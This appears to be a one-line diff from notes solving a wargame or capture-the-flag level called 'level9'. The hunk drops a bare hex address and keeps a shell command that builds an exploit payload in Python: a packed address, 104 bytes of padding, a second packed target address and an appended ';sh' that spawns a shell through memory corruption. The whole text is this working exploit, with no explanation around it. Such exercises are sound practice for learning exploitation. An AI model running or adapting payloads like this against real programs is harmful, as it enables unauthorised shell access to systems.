@@ -1,2 +1,1 @@
-0xB7D86060
 ./level9 `python -c 'import struct; print struct.pack("<I", 0xB7D86060) + "a"*104 + struct.pack("<I", 0x804a00c) + ";sh"'`
